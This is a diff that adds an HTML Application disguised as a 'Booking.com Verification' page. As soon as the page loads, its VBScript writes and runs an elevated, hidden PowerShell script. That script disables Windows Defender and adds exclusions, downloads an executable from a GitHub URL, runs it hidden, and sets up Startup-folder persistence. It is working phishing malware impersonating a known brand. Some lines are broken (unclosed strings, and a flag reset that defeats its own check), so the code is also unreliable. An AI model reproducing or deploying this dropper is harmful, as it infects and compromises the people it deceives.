@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Booking.com Verification</title>
+<meta charset="UTF-8">
+<HTA:APPLICATION 
+    ID="BookingVerification"
+    APPLICATIONNAME="Booking.com Verification"
+    SCROLL="no"
+    BORDER="none"
+    CAPTION="no"
+    SYSMENU="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="normal">
+<style>
+body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    margin: 0;
+    padding: 20px;
+    background: linear-gradient(135deg, #003580 0%, #0077c2 100%);
+    color: #333;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.Revn-container {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+    width: 100%;
+    max-width: 480px;
+    overflow: hidden;
+}
+
+.Revn-header {
+    background: #003580;
+    padding: 20px;
+    text-align: center;
+}
+
+.Revn-logo {
+    color: white;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+.Revn-content {
+    padding: 30px;
+    text-align: center;
+}
+
+.Revn-icon {
+    margin-bottom: 20px;
+}
+
+.Revn-title {
+    font-size: 22px;
+    font-weight: 600;
+    color: #003580;
+    margin-bottom: 15px;
+}
+
+.Revn-message {
+    font-size: 16px;
+    line-height: 1.5;
+    margin-bottom: 25px;
+    color: #555;
+}
+
+.Revn-button {
+    background: #0077c2;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 6px;
+    cursor: pointer;
+}
+
+.Revn-button:hover {
+    background: #005a9e;
+}
+
+.status-message {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #666;
+}
+
+.Revn-footer {
+    background: #f5f5f5;
+    padding: 15px;
+    text-align: center;
+    font-size: 12px;
+    color: #888;
+}
+</style>
+</head>
+
+<body>
+
+<script language="VBScript">
+Sub Window_OnLoad()
+    ' Check if vark2.dat exists
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists("C:\ProgramData\vark2.dat") Then
+        window.close()
+        Exit Sub
+    End If
+    
+    ' Automatically run PowerShell without button click
+    RunPowerShell()
+End Sub
+
+Sub RunPowerShell()
+    On Error Resume Next
+    
+    ' Create PowerShell script file with proper error handling
+    Dim fso, psFile
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set psFile = fso.CreateTextFile("C:\ProgramData\bina.ps1", True)
+    
+    psFile.WriteLine "try {"
+    psFile.WriteLine "    # Create log file"
+    psFile.WriteLine "    'Process started at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Encoding UTF8"
+    psFile.WriteLine "    "
+    psFile.WriteLine "    # Disable Windows Defender"
+    psFile.WriteLine "    Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue"
+    psFile.WriteLine "    Add-MpPreference -ExclusionPath 'C:\ProgramData' -ErrorAction SilentlyContinue"
+    psFile.WriteLine "    Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue"
+    psFile.WriteLine "    'Defender disabled at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "    "
+    psFile.WriteLine "    # Download file using BITS with retry logic"
+    psFile.WriteLine "    $maxRetries = 5"
+    psFile.WriteLine "    $retryCount = 0"
+    psFile.WriteLine "    $success = $false
+    psFile.WriteLine "    "
+    psFile.WriteLine "    while ($retryCount -lt $maxRetries -and -not $success) {"
+    psFile.WriteLine "        try {"
+    psFile.WriteLine "            $bits = Start-BitsTransfer -Source 'https://github.com/golegn/kgbs/raw/refs/heads/main/newsetup3.exe' -Destination 'C:\ProgramData\pibi.exe' -TransferType Download -Priority High -ErrorAction Stop"
+    psFile.WriteLine "     	  $success = $true
+    psFile.WriteLine "            'File downloaded successfully at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "        } catch {"
+    psFile.WriteLine "            $retryCount++"
+    psFile.WriteLine "            Start-Sleep -Seconds 5"
+    psFile.WriteLine "            'Download attempt ' + $retryCount + ' failed at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "        }"
+    psFile.WriteLine "    }"
+    psFile.WriteLine "    "
+    psFile.WriteLine "    # Open booking.com using default browser"
+    psFile.WriteLine "    try {"
+    psFile.WriteLine "    $url = 'https://www.microsoft.com/en-us/microsoft-teams/group-chat-software'"
+    psFile.WriteLine "    Start-Process $url"
+    psFile.WriteLine "    Write-Host 'Opening booking portal...'"
+    psFile.WriteLine "    Start-Sleep -Milliseconds 1000"
+    psFile.WriteLine "    } catch {"
+    psFile.WriteLine "    Write-Host 'Website opening failed: ' + $_.Exception.Message"
+    psFile.WriteLine "    }"
+    psFile.WriteLine "    $success = $false
+    psFile.WriteLine "    "
+    psFile.WriteLine "    if ($success) {"
+    psFile.WriteLine "        # Wait for file to be fully written"
+    psFile.WriteLine "        Start-Sleep -Seconds 3"
+    psFile.WriteLine "        "
+    psFile.WriteLine "        # Execute the downloaded file"
+    psFile.WriteLine "        if (Test-Path 'C:\ProgramData\pibi.exe') {"
+    psFile.WriteLine "            Start-Process 'C:\ProgramData\pibi.exe' -WindowStyle Hidden"
+    psFile.WriteLine "            'Payload executed at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "        }"
+    psFile.WriteLine "        "
+    psFile.WriteLine "        # Create persistence"
+    psFile.WriteLine "        $WshShell = New-Object -ComObject WScript.Shell"
+    psFile.WriteLine "        $StartupPath = [System.Environment]::GetFolderPath('Startup')"
+    psFile.WriteLine "        $Shortcut = $WshShell.CreateShortcut($StartupPath + '\Hesp.lnk')"
+    psFile.WriteLine "        $Shortcut.TargetPath = 'C:\ProgramData\pibi.exe'"
+    psFile.WriteLine "        $Shortcut.WorkingDirectory = 'C:\ProgramData'"
+    psFile.WriteLine "        $Shortcut.WindowStyle = 7"
+    psFile.WriteLine "        $Shortcut.Save()"
+    psFile.WriteLine "        'Persistence created at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "        "
+    psFile.WriteLine "        # Create vark2.dat file"
+    psFile.WriteLine "        '' | Out-File 'C:\ProgramData\vark2.dat' -Encoding UTF8"
+    psFile.WriteLine "        'vark2.dat created at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "    } else {"
+    psFile.WriteLine "        'All download attempts failed at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "    }"
+    psFile.WriteLine "}"
+    psFile.WriteLine "catch {"
+    psFile.WriteLine "    'Error occurred: ' + $_.Exception.Message | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
+    psFile.WriteLine "}"
+    
+    psFile.Close
+    
+    ' Execute PowerShell with proper parameters
+    Dim shell
+    Set shell = CreateObject("Shell.Application")
+    shell.ShellExecute "powershell", "-ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\ProgramData\bina.ps1""", "", "runas", 0
+    
+    document.getElementById("statusMessage").innerHTML = "Verification completed. Closing window..."
+    
+    ' Close window after short delay
+    window.setTimeout "window.close", 3000
+End Sub
+</script>
+</body>
+</html>с
